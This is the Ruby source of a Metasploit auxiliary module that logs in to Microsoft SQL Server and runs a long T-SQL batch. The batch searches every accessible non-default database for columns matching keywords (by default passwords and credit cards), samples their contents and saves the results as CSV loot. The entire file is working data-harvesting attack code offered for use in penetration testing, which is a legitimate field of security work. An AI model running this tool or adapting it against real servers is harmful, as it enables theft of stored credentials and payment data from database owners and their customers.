##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server - Find and Sample Data',
      'Description'    => %q{This script will search through all of the non-default databases
      on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS
      option. If column names are found that match the defined keywords and data is present
      in the associated tables, the script will select a sample of the records from each of
      the affected tables.  The sample size is determined by the SAMPLE_SIZE option, and results
      output in a CSV format.
      },
      'Author'         => [
        'Scott Sutherland <scott.sutherland[at]netspi.com>', # Metasploit module
        'Robin Wood <robin[at]digininja.org>',               # IDF module which was my inspiration
        'humble-desser <humble.desser[at]gmail.com>',         # Help on IRC
        'Carlos Perez <carlos_perez[at]darkoperator.com>',   # Help on IRC
        'hdm',                                               # Help on IRC
        'todb'                                               # Help on GitHub
      ],
      'License'        => MSF_LICENSE,
      'References'     => [[ 'URL', 'http://www.netspi.com/blog/author/ssutherland/' ]],
      'Targets'        => [[ 'MSSQL 2005', { 'ver' => 2005 }]]
    ))

    register_options(
      [
        OptString.new('KEYWORDS', [ true, 'Keywords to search for','passw|credit|card']),
        OptInt.new('SAMPLE_SIZE', [ true, 'Number of rows to sample',  '1']),
      ], self.class)
  end

  def print_with_underline(str)
    print_line(str)
    print_line("=" * str.length)
  end

  def run_host(ip)
    sql_statement()
  end

  def sql_statement()

    #DEFINED HEADER TEXT
    headings = [
      ["Server","Database", "Schema", "Table", "Column", "Data Type", "Sample Data","Row Count"]
    ]

    #DEFINE SEARCH QUERY AS VARIABLE
    sql = "
    -- CHECK IF VERSION IS COMPATABLE = > than 2000
    IF (SELECT SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') as VARCHAR), 1,
    CHARINDEX('.',cast(SERVERPROPERTY('ProductVersion') as VARCHAR),1)-1)) > 0
    BEGIN

      -- TURN OFF ROW COUNT
      SET NOCOUNT ON;
      --------------------------------------------------
      -- SETUP UP SAMPLE SIZE
      --------------------------------------------------
      DECLARE @SAMPLE_COUNT varchar(800);
      SET @SAMPLE_COUNT = '#{datastore['SAMPLE_SIZE']}';

      --------------------------------------------------
      -- SETUP KEYWORDS TO SEARCH
      --------------------------------------------------
      DECLARE @KEYWORDS varchar(800);
      SET @KEYWORDS = '#{datastore['KEYWORDS']}|';

      --------------------------------------------------
      --SETUP WHERE STATEMENT CONTAINING KEYWORDS
      --------------------------------------------------
      DECLARE @SEARCH_TERMS varchar(800);
      SET @SEARCH_TERMS = ''; -- Leave this blank

      -- START WHILE LOOP HERE -- BEGIN TO ITTERATE THROUGH KEYWORDS

        WHILE LEN(@KEYWORDS) > 0
          BEGIN
            --SET VARIABLES UP FOR PARSING PROCESS
            DECLARE @change int
            DECLARE @keyword varchar(800)

            --SET KEYWORD CHANGE TRACKER
            SELECT @change = CHARINDEX('|',@KEYWORDS);

            --PARSE KEYWORD
            SELECT @keyword = SUBSTRING(@KEYWORDS,0,@change) ;

            -- PROCESS KEYWORD AND GENERATE WHERE CLAUSE FOR IT
            SELECT @SEARCH_TERMS = 'LOWER(COLUMN_NAME) like ''%'+@keyword+'%'' or '+@SEARCH_TERMS

            -- REMOVE PROCESSED KEYWORD
            SET @KEYWORDS = SUBSTRING(@KEYWORDS,@change+1,LEN(@KEYWORDS));

          END
        -- REMOVE UNEEDED
        SELECT @SEARCH_TERMS = SUBSTRING(@SEARCH_TERMS,0,LEN(@SEARCH_TERMS)-2);

      --------------------------------------------------
      -- CREATE GLOBAL TEMP TABLES
      --------------------------------------------------
      USE master;

      IF OBJECT_ID('tempdb..##mytable') IS NOT NULL DROP TABLE ##mytable;
      IF OBJECT_ID('tempdb..##mytable') IS NULL
      BEGIN
        CREATE TABLE ##mytable (
          server_name varchar(800),
          database_name varchar(800),
          table_schema varchar(800),
          table_name varchar(800),
          column_name varchar(800),
          column_data_type varchar(800)
        )
      END

      IF OBJECT_ID('tempdb..##mytable2') IS NOT NULL DROP TABLE ##mytable2;
      IF OBJECT_ID('tempdb..##mytable2') IS NULL
      BEGIN
        CREATE TABLE ##mytable2 (
          server_name varchar(800),
          database_name varchar(800),
          table_schema varchar(800),
          table_name varchar(800),
          column_name varchar(800),
          column_data_type varchar(800),
          column_value varchar(800),
          column_data_row_count varchar(800)
        )
      END

      --------------------------------------------------
      -- CURSOR1
      -- ENUMERATE COLUMNS FROM EACH DATABASE THAT
      -- CONTAIN KEYWORD AND WRITE THEM TO A TEMP TABLE
      --------------------------------------------------

      -- SETUP SOME VARIABLES FOR THE MYCURSOR1
      DECLARE @var1 varchar(800);
      DECLARE @var2 varchar(800);

      --------------------------------------------------------------------
      -- CHECK IF ANY NON-DEFAULT DATABASE EXIST
      --------------------------------------------------------------------
      IF (SELECT count(*)
      FROM master..sysdatabases
      WHERE name NOT IN ('master','tempdb','model','msdb')
      and HAS_DBACCESS(name) <> 0) <> 0
      BEGIN
        DECLARE MY_CURSOR1 CURSOR
        FOR

        SELECT name FROM master..sysdatabases
        WHERE name NOT IN ('master','tempdb','model','msdb')
        and HAS_DBACCESS(name) <> 0;

        OPEN MY_CURSOR1
        FETCH NEXT FROM MY_CURSOR1 INTO @var1
        WHILE @@FETCH_STATUS = 0
        BEGIN
        ---------------------------------------------------
        -- SEARCH FOR KEYWORDS/INSERT RESULTS INTO MYTABLE
        ---------------------------------------------------
        SET @var2 = '
        INSERT INTO ##mytable
        SELECT @@SERVERNAME as SERVER_NAME,
        TABLE_CATALOG as DATABASE_NAME,
        TABLE_SCHEMA,
        TABLE_NAME,
        COLUMN_NAME,
        DATA_TYPE
        FROM ['+@var1+'].[INFORMATION_SCHEMA].[COLUMNS] WHERE '

        --APPEND KEYWORDS TO QUERY
        DECLARE @fullquery varchar(800);
        SET @fullquery = @var2+@SEARCH_TERMS;

        EXEC(@fullquery);
        FETCH NEXT FROM MY_CURSOR1 INTO @var1

        END
        CLOSE MY_CURSOR1
        DEALLOCATE MY_CURSOR1
        -------------------------------------------------
        -- CURSOR2
        -- TAKE A X RECORD SAMPLE FROM EACH OF THE COLUMNS
        -- THAT MATCH THE DEFINED KEYWORDS
        -- NOTE: THIS WILL NOT SAMPLE EMPTY TABLES
        -------------------------------------------------

        IF (SELECT COUNT(*) FROM ##mytable) < 1
          BEGIN
            SELECT 'No columns where found that match the defined keywords.' as Message;
          END
        ELSE
          BEGIN
            DECLARE @var_server varchar(800)
            DECLARE @var_database varchar(800)
            DECLARE @var_table varchar(800)
            DECLARE @var_table_schema varchar(800)
            DECLARE @var_column_data_type varchar(800)
            DECLARE @var_column varchar(800)
            DECLARE @myquery varchar(800)
            DECLARE @var_column_data_row_count varchar(800)

            DECLARE MY_CURSOR2 CURSOR
            FOR
            SELECT server_name,database_name,table_schema,table_name,column_name,column_data_type
            FROM ##mytable

              OPEN MY_CURSOR2
              FETCH NEXT FROM MY_CURSOR2 INTO @var_server,
              @var_database,
              @var_table_schema,
              @var_table,
              @var_column,
              @var_column_data_type
              WHILE @@FETCH_STATUS = 0
              BEGIN
              ----------------------------------------------------------------------
              -- ADD AFFECTED SERVER/SCHEMA/TABLE/COLUMN/DATATYPE/SAMPLE DATA TO MYTABLE2
              ----------------------------------------------------------------------
              -- GET COUNT
              DECLARE @mycount_query as varchar(800);
              DECLARE @mycount as varchar(800);

              -- CREATE TEMP TABLE TO GET THE COLUMN DATA ROW COUNT
              IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount
              CREATE TABLE #mycount(mycount varchar(800));

              -- SETUP AND EXECUTE THE COLUMN DATA ROW COUNT QUERY
              SET @mycount_query = 'INSERT INTO #mycount SELECT DISTINCT
                        COUNT('+@var_column+') FROM '+@var_database+'.
                        '+@var_table_schema+'.'+@var_table;
              EXEC(@mycount_query);

              -- SET THE COLUMN DATA ROW COUNT
              SELECT @mycount = mycount FROM #mycount;

              -- REMOVE TEMP TABLE
              IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount

              SET @myquery = '
              INSERT INTO ##mytable2
                    (server_name,
                    database_name,
                    table_schema,
                    table_name,
                    column_name,
                    column_data_type,
                    column_value,
                    column_data_row_count)
              SELECT TOP '+@SAMPLE_COUNT+' ('''+@var_server+''') as server_name,
                    ('''+@var_database+''') as database_name,
                    ('''+@var_table_schema+''') as table_schema,
                    ('''+@var_table+''') as table_name,
                    ('''+@var_column+''') as comlumn_name,
                    ('''+@var_column_data_type+''') as column_data_type,
                    '+@var_column+','+@mycount+' as column_data_row_count
              FROM ['+@var_database+'].['+@var_table_schema++'].['+@var_table+']
              WHERE '+@var_column+' IS NOT NULL;
              '
              EXEC(@myquery);

              FETCH NEXT FROM MY_CURSOR2 INTO
                    @var_server,
                    @var_database,
                    @var_table_schema,
                    @var_table,@var_column,
                    @var_column_data_type
              END
            CLOSE MY_CURSOR2
            DEALLOCATE MY_CURSOR2

            -----------------------------------
            -- SELECT THE RESULTS OF THE SEARCH
            -----------------------------------
            IF (SELECT @SAMPLE_COUNT)= 1
              BEGIN
                SELECT DISTINCT cast(server_name as CHAR) as server_name,
                cast(database_name as char) as database_name,
                cast(table_schema as char) as table_schema,
                cast(table_name as char) as table_schema,
                cast(column_name as char) as column_name,
                cast(column_data_type as char) as column_data_type,
                cast(column_value as char) as column_data_sample,
                cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2
              END
            ELSE
              BEGIN
                SELECT DISTINCT cast(server_name as CHAR) as server_name,
                cast(database_name as char) as database_name,
                cast(table_schema as char) as table_schema,
                cast(table_name as char) as table_schema,
                cast(column_name as char) as column_name,
                cast(column_data_type as char) as column_data_type,
                cast(column_value as char) as column_data_sample,
                cast(column_data_row_count as char) as column_data_row_count FROM ##mytable2
              END
          END
      -----------------------------------
      -- REMOVE GLOBAL TEMP TABLES
      -----------------------------------
      IF OBJECT_ID('tempdb..##mytable') IS NOT NULL DROP TABLE ##mytable;
      IF OBJECT_ID('tempdb..##mytable2') IS NOT NULL DROP TABLE ##mytable2;

      END
      ELSE
      BEGIN
        ----------------------------------------------------------------------
        -- RETURN ERROR MESSAGES IF THERE ARE NOT DATABASES TO ACCESS
        ----------------------------------------------------------------------
        IF (SELECT count(*) FROM master..sysdatabases
        WHERE name NOT IN ('master','tempdb','model','msdb')) < 1
          SELECT 'No non-default databases exist to search.' as Message;
        ELSE
          SELECT 'Non-default databases exist,
          but the current user does not have
          the privileges to access them.' as Message;
        END
    END
    else
    BEGIN
      SELECT 'This module only works on SQL Server 2005 and above.';
    END

    SET NOCOUNT OFF;"



    #STATUSING
    print_line(" ")
    print_status("Attempting to connect to the SQL Server at #{rhost}:#{rport}...")

    #CREATE DATABASE CONNECTION AND SUBMIT QUERY WITH ERROR HANDLING
    begin
      result = mssql_query(sql, false) if mssql_login_datastore
      column_data = result[:rows]
      print_status("Successfully connected to #{rhost}:#{rport}")
    rescue
      print_status ("Failed to connect to #{rhost}:#{rport}.")
    return
    end

    #CREATE TABLE TO STORE SQL SERVER DATA LOOT
    sql_data_tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'SQL Server Data',
      'Ident'   => 1,
      'Columns' => ['Server', 'Database', 'Schema', 'Table', 'Column', 'Data Type', 'Sample Data', 'Row Count']
    )

    #STATUSING
    print_status("Attempting to retrieve data ...")

    if (column_data.count < 7)
      #Save loot status
      save_loot="no"

      #Return error from SQL server
      column_data.each { |row|
        print_status("#{row.to_s.gsub("[","").gsub("]","").gsub("\"","")}")
      }
    return
    else
      #SETUP COLUM WIDTH FOR QUERY RESULTS
      #Save loot status
      save_loot="yes"
      column_data.each { |row|
        0.upto(7) { |col|
          row[col] = row[col].strip.to_s
          }
      }
      print_line(" ")
    end

    #SETUP ROW WIDTHS
    widths = [0, 0, 0, 0, 0, 0, 0, 0]
    (column_data|headings).each { |row|
      0.upto(7) { |col|
        widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col]
      }
    }

    #PRINT HEADERS
    buffer1 = ""
    buffer2 = ""
    headings.each { |row|
      0.upto(7) { |col|
        buffer1 += row[col].ljust(widths[col] + 1)
        buffer2 += row[col]+ ","
      }
      print_line(buffer1)
      buffer2 = buffer2.chomp(",")+ "\n"
    }

    #PRINT DIVIDERS
    buffer1 = ""
    buffer2 = ""
    headings.each { |row|
      0.upto(7) { |col|
        divider = "=" * widths[col] + " "
        buffer1 += divider.ljust(widths[col] + 1)
      }
      print_line(buffer1)
    }

    #PRINT DATA
    buffer1 = ""
    buffer2 = ""
    print_line("")
    column_data.each { |row|
      0.upto(7) { |col|
        buffer1 += row[col].ljust(widths[col] + 1)
        buffer2 += row[col] + ","
      }
      print_line(buffer1)
      buffer2 = buffer2.chomp(",")+ "\n"

      #WRITE QUERY OUTPUT TO TEMP REPORT TABLE
      sql_data_tbl << [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]]

      buffer1 = ""
      buffer2 = ""
      print_line(buffer1)
    }
    disconnect

    this_service = nil
    if framework.db and framework.db.active
      this_service = report_service(
        :host  => rhost,
        :port => rport,
        :name => 'mssql',
        :proto => 'tcp'
      )
    end

    #CONVERT TABLE TO CSV AND WRITE TO FILE
    if (save_loot=="yes")
      filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_sqlserver_query_results.csv"
      path = store_loot("mssql.data", "text/plain", datastore['RHOST'], sql_data_tbl.to_csv, filename, "SQL Server query results",this_service)
      print_status("Query results have been saved to: #{path}")
    end

  end

end
